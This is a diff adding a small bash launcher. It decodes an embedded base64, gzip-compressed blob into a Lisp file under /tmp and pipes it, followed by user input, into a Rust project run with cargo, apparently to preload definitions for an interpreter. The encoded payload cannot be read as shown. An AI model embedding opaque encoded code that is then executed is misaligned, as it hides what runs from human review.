@@ -1,0 +1,13 @@
+#!/bin/env bash
+cd ./src
+base64 -d <<'B64' | gzip -d > /tmp/opencode/sanlian_def.lisp
+H4sIAAAAAAACA7VWy07CQBTd+xWzY5rwEX6KRaohASS6EHcgyCMsXJsmdmiJuGRheEQD/zJx4Wcw
+d0prO73DFMHmLEh75s45954ppWXnqmZf3t6Q7+XwZ/NKqHVGyAUtOdeVuvglruI5rdkNQqt2rVS2
+CW1a4f342rEJLVfuGlX7gRSKTYvQunNfrdQdy0rzC1RZztkjAr/FA8aDFv40J6CIwCSB7lE1fcbH
+3T2EfNaWPNhITP/kSLhYRxVQvIHNg8uKmgs+bp3I2uYwATDrWP8TRnhPEKZ7dGYWfhm7bbYG/UlY
+SyVqAonS6fFnyIDGojl9zgacoeNbYKWUHeeZDCzkzQRHLMlaAyNzSe5p5SGCe1hjFUcjztqyFTJ7
+IoHQkyFnn2lmH3M3UGk6MA92QaemZC9PNV1QU77acOrDbofi41MG5JXJWowXvYCRIZAntOaHgr3d
+sBTxv2v7MD4/0hz1/ICQa5Lzj9YAWIpUa8nhdkxvj3XE9GSYZZ59/JwarPmrfGfteV+E1DfGlAcf
+GVOeYV6AGWeuhjaQj3qmN6QrN+oktLkgD4ebDblm62wdT94ZHvUlkPsvW3yuWFsUDzVJFQkAAA==
+B64
+{ cat /tmp/opencode/sanlian_def.lisp; cat; } | cargo run --quiet
